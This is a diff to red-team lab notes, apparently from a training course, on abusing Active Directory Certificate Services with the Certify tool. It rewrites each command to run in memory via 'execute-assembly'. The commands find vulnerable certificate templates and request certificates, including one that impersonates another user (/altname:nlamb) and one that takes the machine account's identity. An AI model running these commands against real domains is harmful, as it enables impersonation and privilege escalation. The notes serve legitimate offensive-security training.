@@ -7,7 +7,7 @@
 Finds ADCS Certificate Authorities
 
 ``` 
-C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
 ```
 
 This will output lots of useful information, including the root CA and subordinate CAs:
@@ -46,7 +46,7 @@ The Cert Chain is useful to note, as this shows us that "sub-ca" in the DEV doma
 Finds misconfigured ADCS templates.
 
 ```
-C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
 ```
 
 ![](https://files.cdn.thinkific.com/file_uploads/584845/images/d7e/9d6/306/customuser.png)
@@ -73,7 +73,7 @@ Requests certificate for user.
 Requests a certificate for the current user.
 
 ```
-C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
 ```
 
 ### Custom User
@@ -81,7 +81,7 @@ C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic
 Requests a certificate for the specified user.
 
 ```
-C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
 ```
 
 
@@ -90,5 +90,5 @@ C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic
 The `/machine` parameter is required to auto-elevate to SYSTEM and assume the identity of the computer account.
 
 ```
-C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
 ```
